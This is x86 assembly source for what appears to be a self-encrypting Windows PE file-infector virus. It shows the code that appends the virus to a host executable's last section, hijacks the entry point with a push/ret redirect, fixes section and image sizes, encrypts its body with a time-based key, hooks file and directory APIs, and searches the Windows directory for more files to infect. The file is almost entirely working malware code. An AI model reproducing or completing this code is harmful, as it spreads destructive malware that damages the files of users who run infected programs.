	add     ebp,eax                                         ;Ebp points to the end of OT


	add     ecx,dword ptr [ebp.OH_SizeOfRawData-028h]       ;ecx+=Physical size of last section
	push    esi

	add     ecx,dword ptr [ebp.OH_VirtualAddress-028h]      ;ecx=ecx+RVA last section

;IN ecx is now the address of the return to my Virus
;But before patching the Push ... Ret we are going to store the initial 6 bytes!

	movsd
	movsw                                           	;Do transfer!

	pop     edi

	mov     eax,068h					;Push ....
	stosb                                          	 	;edi already points to offset of the 1st instruction
	mov	eax,ecx
	stosd
	
	mov	dword ptr [OffsetHostStart+ebx],eax		;Store for rearrage the Encryption routine
	mov	eax,0c3h					;ret
	stosb
	
	mov     edi,dword ptr [ebp.OH_PointerToRawData-028h]    ;edi=physical offset of last section

;----------------------------------------------------------------------------------------------------------------------------
;Arrange the PhysicalSize, VirtualSize & SizeOfImage  field of the infected object
;----------------------------------------------------------------------------------------------------------------------------
	mov     eax,dword ptr [ebp.OH_SizeOfRawData-028h]       ;eax=Size of Raw Data
	mov	esi,edi						;PhysicalOffset

	mov     ecx,dword ptr [FileAlignment+ebx]               ;ecx=File Alignment

	add	edi,eax						;edi=edi+physical size of last Section

	add     eax,(Virus_End-Virus_Start)                     ;Add VirusSize
	xor	edx,edx                                                     
	div     ecx                                             
	inc     eax
	mul     ecx
	mov     dword ptr [ebp.OH_SizeOfRawData-028h],eax

	add	esi,eax						;esi has the aparent size
	mov     ecx,dword ptr [SectionAlignment+ebx]            ;ebx=Section Alignment
	xor	edx,edx
	div     ecx
	inc     eax
	mul     ecx
	mov     dword ptr [ebp.OH_VirtualSize-028h],eax

	add     eax,dword ptr [ebp.OH_VirtualAddress-028h]
	mov	ecx,eax
	mov     eax,dword ptr [ebp.OH_Characteristics-028h]
	or      eax,080000000h                                  ;Set write permission in the last object !
	push    edi

	mov     dword ptr [ebp.OH_Characteristics-028h],eax

	mov     ebp,dword ptr [PointerToPe+ebx]
	mov     dword ptr [ebp.IF_SizeOfImage],ecx
;----------------------------------------------------------------------------------------------------------------------------
;End of PhysicalSize, VirtualSize & SizeOfImage rearrangements
;----------------------------------------------------------------------------------------------------------------------------
	;mov     dword ptr [ebp.IF_CheckSum],"yXeS"			;This will stay just for personal check-out 

	
	call    UnMap&Close                                             ;Doesn't need arguments

;Lets Calculate the ADD FACTOR (factor to add to filesize to make it multiple of Multiple)

	mov	ecx,Multiple
	mov	eax,esi						;Aparent Size
	mov	edi,eax
	xor	edx,edx
	div	ecx						;(HostSize+Virussize)/13
	sub	ecx,edx						;Multiple-Remainder
								;Ecx has now the "ADD FACTOR"
	lea     edi,dword ptr [FindData.WFD_szFileName+ebx]

	add	esi,ecx						;Add to the size of the file the AddFactor	

	call    Open&MapFile

	pop     edi
	cmp     eax,0
	jz      Not_The_First_Time

	xor	byte ptr [Magik_Byte+ebx],4
	add     edi,eax                                         ;add the base address of file
	lea     esi,[Virus_Start+ebx]
	mov     ecx,(Virus_End-Virus_Start)/4+1			;Round Factor
	
	lea	eax,[End_Litle_Piece+ebx]
	push	eax						;Push address for the return
	push	ecx						;Push movsd counter
	push	esi						;Pointer To Virus Start
	push	edi						;Pointer to end of the host

	lea	edi,[SystemTime+ebx]
	lea	esi,[Encryption_Key+ebx]
	push	edi
	call	dword ptr [funcGetSystemTime+ebx]

	mov	eax,dword ptr [SystemTime.wSecond+ebx]		;Dword second:Milisecond
	mov	ecx,(Encrypt_End-Encrypt_Start)

	mov	dword ptr [esi],eax				;Change the Encryption Key

	lea	eax,dword ptr [Encrypt_End+ebx]
	mov	dword ptr [Point_Of_Encryption_Start+ebx],eax

	lea	esi,[Encrypt_Start+ebx]
	lea	edi,[Encrypt_Place+ebx]
	rep	movsb

	lea	esi,[Litle_Piece+ebx]
	mov	ecx,End_Litle_Piece-Litle_Piece
	rep	movsb

	mov	ecx,(Encrypt_End-Encrypt_Start)
	lea	esi,[Encrypt_Start+ebx]
	rep	movsb

	mov	eax,0c3h					;Ret
	stosb
	jmp	Encrypt_Place

Litle_Piece:
	pop	edi
	pop	esi	
	pop	ecx
	
	rep     movsd                                           ;Write Virus To File

	mov	eax,dword ptr [OffsetHostStart+ebx]
	sub	edi,4*((Virus_End-Virus_Start)/4+1)-6		;Size of instruction till Point_of_Encryption... in the host
	add	eax,(Encrypt_End-Encrypt_Start)
	stosd
End_Litle_Piece:
	inc     dword ptr [FileInfectCounter+ebx]
	jmp     Close_File


Exit_To_Host:
	mov	eax,dword ptr [HostEntryPoint+ebx]
	cmp	eax,0
	je	Really_Exit2
	cmp	eax,dword ptr [funcExitProcess+ebx]
	jne	Really_Exit

	mov	dword ptr [HostEntryPoint+ebx],0
	lea	esi,[Directory+ebx]
	push	MAX_PATH
	push	esi
	call	dword ptr [funcGetWindowsDirectoryA+ebx]
Magik_Byte=byte ptr $-4
	push	esi
	call	dword ptr [funcSetCurrentDirectoryA+ebx]
	mov	dword ptr [EntranceCounter+ebx],0
	mov	dword ptr [FileSearchCounter+ebx],-5
	jmp	Fuck_Directory

Really_Exit2:
	mov	eax,dword ptr [funcExitProcess+ebx]
	mov	dword ptr [HostEntryPoint+ebx],eax
Really_Exit:
	popfd                                   ;Pop Flags
	popad                                   ;Pop Registers
	push    12345678h
HostEntryPoint=dword ptr $-4
	ret
Virus_End:


Virtual_Start:

VirFindFirstFileA:
	push    offset funcFindFirstFileA
	jmp     Entrance_From_Api       

VirFindFirstFileW:
	push    offset funcFindFirstFileW
	jmp     Entrance_From_Api

VirGetCurrentProcess:
	push    offset funcGetCurrentProcess    
	jmp     Entrance_From_Api

VirWriteProcessMemory:
	push    offset funcWriteProcessMemory   
	jmp     Entrance_From_Api

VirGetLastError:
	push    offset funcGetLastError 
	jmp     Entrance_From_Api

VirCreateFileA:
	push    offset funcCreateFileA          
	jmp     Entrance_From_Api

VirCreateFileMappingA:
	push    offset funcCreateFileMappingA   
	jmp     Entrance_From_Api

VirMapViewOfFile:
	push    offset funcMapViewOfFile        
	jmp     Entrance_From_Api

VirUnmapViewOfFile:
	push    offset funcUnmapViewOfFile      
	jmp     Entrance_From_Api

VirCloseHandle:
	push    offset funcCloseHandle          
	jmp     Entrance_From_Api

VirFindClose:
	push    offset funcFindClose
	jmp     Entrance_From_Api

VirSetFileAttributes:
	push    offset funcSetFileAttributes    
	jmp     Entrance_From_Api

VirGetCurrentDirectory:
	push    offset funcGetCurrentDirectoryA  
	jmp     Entrance_From_Api

VirSetcurrentDirectory:
	push    offset funcSetCurrentDirectoryA
	jmp     Entrance_From_Api

VirGetWindowsDirectory:
	push    offset funcGetWindowsDirectoryA
	jmp     Entrance_From_Api

VirGetSystemDirectory:
	push    offset funcGetSystemDirectoryA
	jmp     Entrance_From_Api

VirExitProcess:
	push    offset funcExitProcess
	jmp     Entrance_From_Api

VirGetDriveTypeA:
	push    offset funcGetDriveTypeA                
	jmp     Entrance_From_Api

VirCreateFileW:
	push    offset funcCreateFileW  
	jmp     Entrance_From_Api

VirDeleteFileA:
	push    offset funcDeleteFileA  
	jmp     Entrance_From_Api

VirDeleteFileW:
	push    offset funcDeleteFileW  
	jmp     Entrance_From_Api

VirGetFileType:
	push    offset funcGetFileType  
	jmp     Entrance_From_Api

VirSetFileTime:
	push    offset funcSetFileTime
	jmp     Entrance_From_Api

VirVirtualAlloc:
	push    offset funcVirtualAlloc
	jmp     Entrance_From_Api

VirGetSystemTime:
	push	offset funcGetSystemTime
	jmp	Entrance_From_Api

VirLoadLibraryA:
	push	offset funcLoadLibraryA
	jmp	Entrance_From_Api

VirFreeLibrary:
	push	offset funcFreeLibrary
	jmp	Entrance_From_Api

VirCreateThread:
	push	offset funcCreateThread
	jmp	Entrance_From_Api




SectionAlignment        dd      ?                               ;Heap?
FileAlignment           dd      ?                               ;Heap?
FindData                WIN32_FIND_DATA ?                       ;Heap?
HandleCreation          dd      ?                               ;Heap?
HandleFileMap           dd      ?                               ;Heap?
HandleSearch            dd      ?                               ;Heap?
PointerToMappedView     dd      ?                               ;Heap?
PointerToPe             dd      ?                               ;Heap?
Directory        	db      MAX_PATH dup (?)                ;Heap?
SystemTime		SYSTEMTIME	?
FileInfectCounter       dd      0
FileSearchCounter       dd      0
EntranceCounter         dd      0 
OffsetHostStart		dd	0

Encrypt_Place:
			db	(Encrypt_End-Virus_Start)*2+End_Litle_Piece-Litle_Piece+1	dup (0)
Virtual_End:





;----------------------------------------------------------------------------------------------------------------------------
;                                       Only used in the first generation
;----------------------------------------------------------------------------------------------------------------------------



extrn   GetModuleHandleA                :proc
extrn   GetProcAddress                  :proc
extrn	GetLastError			:proc


First_Generation:

jumps
Initiate:       
	push    NULL
	call    GetModuleHandleA
	.if     eax==NULL
	call	GetLastError
	ret
	.endif
	mov     Image_Base,eax
	mov     edx,eax
	add     eax,dword ptr [eax+03ch]        ;get location of PE-Header
	mov     eax,dword ptr [eax+080h]        ;eax=RVA of IAT
	add     eax,edx                         ;eax points to IAT 
	mov     Import_Table_Address,eax
	
	lea     eax,Image_EntryPoint

	mov     dword ptr [eax],offset Initiate

	
	jmp     Go_And_Fuck_Everything
	end     First_Generation        
End_First_Generation: